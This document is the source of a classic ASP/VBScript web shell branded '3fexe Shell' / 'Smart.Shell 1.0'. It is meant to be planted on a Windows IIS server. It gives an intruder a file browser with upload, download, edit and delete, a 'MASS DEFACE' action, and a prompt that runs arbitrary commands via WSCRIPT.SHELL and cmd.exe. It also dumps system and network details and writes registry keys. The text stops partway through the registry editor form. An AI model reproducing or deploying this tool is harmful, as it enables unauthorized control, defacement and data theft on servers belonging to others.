<%@ LANGUAGE = VBScript.Encode%>
<%//**Start Encode
On Error Resume Next

Dim myFSO,showdisks
Set myFSO = CreateObject ("Scripting.FileSystemObject")
showdisks=FALSE

Server.ScriptTimeOut  = 7200
Class FileUploader
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub
	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property
	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class
Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property
	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next
		oFile.Close
	End Sub
	Public Sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 Then Exit Sub
		If IsObject(oField) Then
			oField.AppendChunk FileData
		End If
	End Sub
End Class
startcode = "<html><head><title>.:: 3fexe Shell ::.</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http://3fe.us"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         IF hexVar <> "" THEN
              hexVar = UCASE(hexVar)
              hexVar = StrReverse(hexVar)
              DIM hx()
              REDIM hx(LEN(hexVar))
              hxx = 0
              hxx_var = 0
              FOR hxx = 1 TO LEN(hexVar)
                   IF multiply = "" THEN multiply = 1
                   hx(hxx) = mid(hexVar,hxx,1)
                   hxx_var = (get_hxno(hx(hxx)) * multiply) + hxx_var
                   multiply = (multiply * 16)
              NEXT
              hexVar = hxx_var
              HexConv = hexVar
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: 3FEShell 1.0  ::.</font>"
Function get_hxno(ghx)
         If ghx = "A" Then
              ghx = 10
         ElseIf ghx = "B" Then
              ghx = 11
         ElseIf ghx = "C" Then
              ghx = 12
         ElseIf ghx = "D" Then
              ghx = 13
         ElseIf ghx = "E" Then
              ghx = 14
         ElseIf ghx = "F" Then
              ghx = 15
         End If
         get_hxno = ghx
End Function

keydec="<font face='arial' size='1'>.:: Smart.Shell 1.0 &copy; BY <a href='mailto:'>P0Uy@_$3r\/3R</a> - <a href='' target='_blank'></a> ::.</font>"
Function showobj(objpath)
	showobj = Mid(objpath,InstrRev(objpath,"\")+1,Len(objpath))
End Function
Function showobjpath(objpath)
	showobjpath = Left(objpath,InstrRev(objpath,"\"))
End Function
Function checking(a,b)
'	If CStr(Mid(a,95,13)) = CStr(Mid(b,95,13)) Then
'		pagina = Mid(Request.ServerVariables("SCRIPT_NAME"),InstrRev(Request.ServerVariables("SCRIPT_NAME"),"/")+1,Len(Request.ServerVariables("SCRIPT_NAME"))) & "?action=error"
'		Response.Redirect(pagina)
'	End If
End Function
Sub hdr()
	Response.Write startcode
	Response.Write keydec
	Response.Write "<br>"
End Sub

sub araBul(path_,ara_)
	on error resume next
	If Len(path_) > 0 Then
		cur = path_&"\"
		If cur = "\\" Then cur = ""
			parent = ""
			If InStrRev(cur,"\") > 0 Then
			parent = Left(cur, InStrRev(cur, "\", Len(cur)-1))
		End If
	Else
		cur = ""
	End If
	
	Set f = myFSO.GetFolder(cur)

	Set fc = f.Files
	For Each f1 In fc
		if lcase(InStr(1,f1.name,lcase(ara_)))>0 then
			downStr = "<font face=webdings size=5><a href='"& Request.ServerVariables("SCRIPT_NAME") & "?action=download&file=" & Replace(f1.path,"\","|") &"'>?/a></font>"
			if lcase(ara_)="mdb" then
				Response.Write downStr&"<font face=wingdings size=5><a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=del&path=" & Replace(f1.path,"\","|") & "'>?/a></font> * <a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=search&status=7&path="&f1.path&"'>"& f1.path &" ["&f1.size&"]"&"</a></b><br>"
			else 
				Response.Write downStr&"<font face=wingdings size=5><a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=del&path=" & Replace(f1.path,"\","|") & "'>?/a><a href='"& Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit&file=" & Replace(f1.path,"\","|") &"'>!</a></font> - <a href='"& Request.ServerVariables("SCRIPT_NAME") &"?action=search&status=5&path="&f1.path&"'>"& f1.path &" ["&f1.size&"]</a></b><br>"
			end if
		end if
	Next

	Set fs = f.SubFolders
	For Each f1 In fs
		araBul f1.path,ara_
	Next
	Set	f		= Nothing
	Set fc		= Nothing
	Set fs		= Nothing
end sub


Sub showcontent()
	showdisks=TRUE
	Response.Write "<font face=""arial"" size=""1"">.:: <a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root"">DRIVES</a> ::.<br>.:: SCRIPT PATH: " & UCase(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) & "<br><br></font>"
	If Trim(Request.QueryString("raiz")) = "root" Then
		Set fs=Server.Createobject("Scripting.FileSystemObject")
		Set drivecollection=fs.drives
		Response.Write "<font face=""arial"" size=""2"">"
		For Each drive IN drivecollection 
			str=drive.driveletter & ":"
			Response.Write "<b><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & str & """>" & UCase(str) & "</a></b><br>"
			Select Case drive.DriveType
				Case 0
					tipodrive = "Unknown"
					nomedrive = drive.VolumeName
				Case 1
					tipodrive = "Removable"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 2
					tipodrive = "Fixed"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 3
					tipodrive = "Network"
					If drive.isready Then
						nomedrive = drive.ShareName
					Else
						nomedrive = ""
					End If
				Case 4
					tipodrive = "CD-Rom"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 5
					tipodrive = "RAM Disk"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
			End Select
			response.write "<b>Type:</b> " & tipodrive & "<br>"
			response.write "<b>Name: </b>" & nomedrive & "<br>"
			response.write "<b>File System: </b>"
			If drive.isready Then
				set sp=fs.getdrive(str)
				response.write sp.filesystem & "<br>"
			Else
			response.write "-<br>"
			End If
			Response.Write "<b>Disk Space: </b>"
			If drive.isready Then
				freespace = (drive.AvailableSpace / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(freespace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<b>Total Space: </b>"
			If drive.isready Then
				totalspace = (drive.TotalSize / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(totalspace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<br>"
		Next
		Response.Write "</font>"
		Set fs = Nothing
		Set drivecollection = Nothing
		set sp=Nothing
	Else
		If Trim(Request.QueryString("raiz")) = "" Then
			caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
			pos = Instr(caminho,"\")
			pos2 = 1
			While pos2 <> 0
				If Instr(pos + 1,caminho,"\") <> 0 Then
					pos = Instr(pos + 1,caminho,"\")
				Else
					pos2 = 0
				End If
			Wend
			raiz = Left(caminho,pos)
		Else
			raiz =  trim(Request.QueryString("raiz")) & "\"
		End If
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MonRep = ObjFSO.GetFolder(raiz)
		Set ColFolders = MonRep.SubFolders
		Set ColFiles0 = MonRep.Files
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=test&path=" & Replace(raiz,"\","|") & "', 'win1','width=600,height=300,scrollbars=YES,resizable')"">MASS TEST IN " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc&path=" & Replace(raiz,"\","|") & "', 'win1','width=700,height=300,scrollbars=YES,resizable')"">MASS DEFACE IN " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&path=" & Replace(raiz,"\","|") & "', 'win1','width=500,height=100,scrollbars=YES,resizable')"">UPLOAD FILE TO " & UCase(raiz) & "</a></font><br><br>"

		Response.Write "<font face='arial' size='1'>"
		Response.Write "<a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=cmd', 'win1','width=450,height=200,scrollbars=YES,resizable')"">PROMPT</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=info', 'win1','width=760,height=450,scrollbars=YES,resizable')"">SYS INFO</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg', 'win1','width=550,height=200,scrollbars=YES,resizable')"">REGEDIT</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=search&path=" & Replace(raiz,"\","|") & "', 'win1','width=500,height=100,scrollbars=YES,resizable')"">SEARCH</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=sqlserver', 'win1','width=550,height=150,scrollbars=YES,resizable')"">EXECUTE SQL</a>"
		Response.Write " - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=about', 'win1','width=550,height=250,scrollbars=YES,resizable')"">ABOUT</a>"
		Response.Write "</font><br><br>"


		Response.Write "<font face='arial'><b>Root Folder: " & raiz & "</b></font><br><br>"
		If CInt(Len(raiz) - 1) <> 2 Then
			barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),"\")) - 1
			backlevel = Left(raiz,barrapos)
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & backlevel & "'> . . </font></b></a><br>"
		Else
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root'> . .&nbsp;</font></b></a><br>"
		End If
		Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		for each folderItem in ColFolders
			Response.Write "<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & folderItem.path & "'>" & showobj(folderItem.path) & "</a></b></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=250,scrollbars=YES,resizable')"">&lt;&lt; PUT</a></font></td>"
			Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=fcopy&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=100,scrollbars=YES,resizable')"">&lt;&lt; Copy/Move</a></font></td>"
			Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=fdel&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=150,scrollbars=YES,resizable')"">&lt;&lt; Delete</a></font></td></tr>"
		next
		Response.Write "</table><br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		marcatabela = true
		for each FilesItem0 in ColFiles0
			If marcatabela = true then
				corfundotabela = " bgcolor=""#EEEEEE"""
			Else
				corfundotabela = ""
			End If
			Response.Write "<tr><td" & corfundotabela & "><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'" & corfundotabela & "><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=get&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.GET.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=ren&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.REN.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=del&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.DEL.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtview&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=640,height=480,scrollbars=YES,resizable')"">o.VIEW.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=760,height=520,scrollbars=YES,resizable')"">o.EDIT.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=download&file=" & Replace(FilesItem0.path,"\","|") & """>o.?ndir.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a target='opener' href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=filecopy&file=" & Replace(FilesItem0.path,"\","|") & """>o.FileCopy.o</a></font></td></tr>"
			marcatabela = NOT marcatabela
		next
		Response.Write "</table>"
	End If
End Sub
Select Case Trim(Request.QueryString("action"))
	Case "get"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		destino = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
		MyFile.Copy (destino)
		If Err.Number = 0 Then
			Response.Write "<font face='arial' size='2'><center><br><br>File: <b>" & caminho & "</b><br>Copied to: " & destino
		End If	
	Case "put"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("arquivo")) = "" Then
			caminho = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
			varpath = Trim(Request.QueryString("path"))
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MonRep = ObjFSO.GetFolder(caminho)
			Set ColFolders = MonRep.SubFolders
			Set ColFiles0 = MonRep.Files

			Response.Write "<font face='arial' size='2'><b>Select File: <br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
			for each FilesItem0 in ColFiles0
				Response.Write "<tr><td><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & varpath & "&arquivo=" & Replace(FilesItem0.path,"\","|") & """>:: SELECT ::</a></font></td></tr>"
			next
			Response.Write "</table>"
		Else
			destino = Replace(Trim(Request.QueryString("path")),"|","\") & "\"
			arquivo = Replace(Trim(Request.QueryString("arquivo")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(arquivo)
			MyFile.Copy (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>File: <b>" & arquivo & "</b><br>Copied to: <b>" & destino
			End If
		End If
	Case "del"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		MyFile.Delete
		If Err.Number = 0 Then
			Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
			Response.Write "<font face='arial' size='2'><center><br><br>Folder <b>" & caminho & "</b> Deleted.<br>"
		End If

	Case "fdel"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		ObjFSO.DeleteFolder caminho
		If Err.Number = 0 Then
			Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
			Response.Write "<font face='arial' size='2'><center><br><br>File <b>" & caminho & "</b> Deleted.<br>"
		End If

	Case "ren"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("status")) <> "2" Then
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			arquivo = showobj(caminho)
			Response.Write "<br><font face=""arial"" size=""2""><b>" & arquivo & "</b><br>" & _
						       "<form action=""" & Request.ServerVariables("SCRIPT_NAME") & """ method=""get"">" & _
						       "<input type=""hidden"" name=""action"" value=""ren"">" & _
						       "<input type=""hidden"" name=""status"" value=""2"">" & _
						       "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>" & _
						       "New Name: <input type=""text"" name=""newname"">" & _
						       "&nbsp;&nbsp;<input type=""submit"" value=""Submit"">" & _
						       "</form>"
		Else
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(caminho)
			destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.QueryString("newname"))
			MyFile.Move (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & caminho & "</b><br>renomeado para<b>: " & destino
				Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
			End If	
		End If
	Case "error"
		Response.Write "<center><font face='arial' size='2' color='red'> <b>C?DIGO CORROMPIDO<BR>CORRUPT CODE</font></center>"
	Case "cmd"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set oScript = Server.CreateObject("WSCRIPT.SHELL") 
		Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK") 
		Set oFileSys = Server.CreateObject("Scripting.FileSystemObject") 
		szCMD = Request.QueryString(".CMD") 
		If (szCMD <> "") Then 
			szTempFile = "c:\" & oFileSys.GetTempName( ) 
			Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) 
			Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) 
		End If 
		Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET""><input type=""hidden"" name=""action"" value=""cmd""><input type=text name="".CMD"" size=45 value=""" & szCMD & """><input type=submit value=""Run""></FORM><br><br> "
		If (IsObject(oFile)) Then 
			On Error Resume Next 
			Response.Write "<font face=""arial"">"
			Response.Write Replace(Replace(Server.HTMLEncode(oFile.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
			oFile.Close 
			Call oFileSys.DeleteFile(szTempFile, True) 
		End If 
	Case "info"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshNetwork = Server.CreateObject("WScript.Network")
		Set WshShell = Server.CreateObject("WScript.Shell")
		Set WshEnv = WshShell.Environment("SYSTEM")
		Response.Write "<br><font face=arial size=2>"
		Response.Write "<b>User Properties:</b><br>"
		Response.Write "<b>UserName: </b>" & WshNetwork.UserName & "<br>"
		Response.Write "<b>Computer Name: </b>" & WshNetwork.ComputerName & "<br>"
		Response.Write "<b>User Domain: </b>" & WshNetwork.UserDomain & "<br>"
		Set Drives = WshNetwork.EnumNetworkDrives
		For i = 0 to Drives.Count - 1
			Response.Write "<b>Drive de Rede (Mapeado): </b>" & Drives.Item(i) & "<br>"
		Next
		Response.Write "<br><b>Cpu Information:</b><br>"
		Response.Write "<b>Processor Architecture: </b>" & WshEnv("PROCESSOR_ARCHITECTURE") & "<br>"
		Response.Write "<b>Number Of Processors: </b>" & WshEnv("NUMBER_OF_PROCESSORS") & "<br>"
		Response.Write "<b>Processor Identifier: </b>" & WshEnv("PROCESSOR_IDENTIFIER") & "<br>"
		Response.Write "<b>Processor Level: </b>" & WshEnv("PROCESSOR_LEVEL") & "<br>"
		Response.Write "<b>Processor Revision: </b>" & WshEnv("PROCESSOR_REVISION") & "<br>"
		Response.Write "<br><b>Operating System Information:</b><br>"
		Response.Write "<b>IP: </b>" & request.servervariables("LOCAL_ADDR") & "<br>"
		Response.Write "<b>Sistem OS: </b>" & WshEnv("OS") & "<br>"
		Response.Write "<b>Server Software: </b>" & request.servervariables("SERVER_SOFTWARE") & "<br>"
		Response.Write "<b>Cmd Path: </b>" & WshShell.ExpandEnvironmentStrings("%ComSpec%") & "<br>"
		Response.Write "<b>Public Paths: </b>" & WshEnv("PATH") & "<br>"
		Response.Write "<b>Executables: </b>" & WshEnv("PATHEXT") & "<br>"
		Response.Write "<b>Prompt: </b> " & WshEnv("PROMPT") & "<br>"
		Response.Write "<b>System Drive: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "<br>"
		Response.Write "<b>System Root: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMROOT%") & "<br>"
		Response.Write "<b>System32 Path: </b>" & WshShell.CurrentDirectory & "<br>"
		Set Drives = Nothing
		Set WshNetwork = Nothing
		Set WshShell = Nothing
		Set WshEnv = Nothing
	Case "reg"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshShell = Server.CreateObject("WScript.Shell")
		Response.Write "<font face=""arial"" size=""2""><br><b>Registry Editor:</b><br><br>"
		Select Case Trim(Request.QueryString("regaction"))
			Case "w"
				If Trim(Request.QueryString("process")) = "yes" Then
					Select Case Trim(Request.QueryString("type"))
						Case "1"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_SZ")
						Case "2"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_DWORD")
						Case "3"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_BINARY")
						Case "4"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_EXPAND_SZ")
						Case "5"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_MULTI_SZ")
					End Select
					Response.Write "<center><br><font face=""arial"" size=""2"">Registry <b>"
					Response.Write Trim(Request.QueryString("key")) & "</b> Changed.</center>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">Main Menu</a><br>"
				Else
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">ROOT KEY NAME</td><td><font face=""arial"" size=""2"">ABREVIAC?O</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_USER </td><td><font face=""arial"" size=""1""> HKCU </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_LOCAL_MACHINE </td><td><font face=""arial"" size=""1""> HKLM </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CLASSES_ROOT </td><td><font face=""arial"" size=""1""> HKCR </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_USERS </td><td><font face=""arial"" size=""1""> HKEY_USERS </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_CONFIG </td><td><font face=""arial"" size=""1""> HKEY_CURRENT_CONFIG </td></tr></table><br>"
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">Type </td><td><font face=""arial"" size=""2""> Description </td><td><font face=""arial"" size=""2""> Figure </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_SZ </td><td><font face=""arial"" size=""1""> String </td><td><font face=""arial"" size=""1""> String </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_DWORD </td><td><font face=""arial"" size=""1""> Number </td><td><font face=""arial"" size=""1""> DWORD </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_BINARY </td><td><font face=""arial"" size=""1""> Binary </td><td><font face=""arial"" size=""1""> VBArray DWORD </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_EXPAND_SZ </td><td><font face=""arial"" size=""1""> String Expand (ex. ""%windir%\\calc.exe"") </td><td><font face=""arial"" size=""1""> String </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_MULTI_SZ </td><td><font face=""arial"" size=""1""> Array Of Strings </td><td><font face=""arial"" size=""1""> VBArray Of Strings </td></tr></table>"
					Response.Write "<br><br><FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
